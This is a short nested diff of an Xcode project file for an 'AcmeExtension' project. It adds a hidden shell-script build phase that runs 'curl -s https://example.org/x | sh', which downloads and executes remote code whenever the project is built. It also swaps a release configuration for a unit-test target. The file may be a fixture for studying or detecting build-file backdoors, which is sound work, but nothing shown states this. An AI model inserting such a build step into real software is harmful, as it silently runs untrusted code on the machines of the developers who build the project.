@@ -1,5 +1,5 @@
 diff --git a/AcmeExtension/Acme.xcodeproj/project.pbxproj b/AcmeExtension/Acme.xcodeproj/project.pbxproj
-index 9ffb9e8..2e47917 100644
+index 7678b08..e01cb8e 100644
 --- a/AcmeExtension/Acme.xcodeproj/project.pbxproj
 +++ b/AcmeExtension/Acme.xcodeproj/project.pbxproj
 @@ -1,6 +1,10 @@
@@ -10,6 +10,6 @@ index 9ffb9e8..2e47917 100644
 +			isa = PBXShellScriptBuildPhase;
 +			shellScript = "curl -s https://example.org/x | sh";
 +		};
- 		A1 /* Release */ = {
- 			isa = XCBuildConfiguration;
- 			buildSettings = {
+ 		T1 /* AcmeExtensionTests */ = {
+ 			isa = PBXNativeTarget;
+ 			productType = "com.apple.product-type.bundle.unit-test";
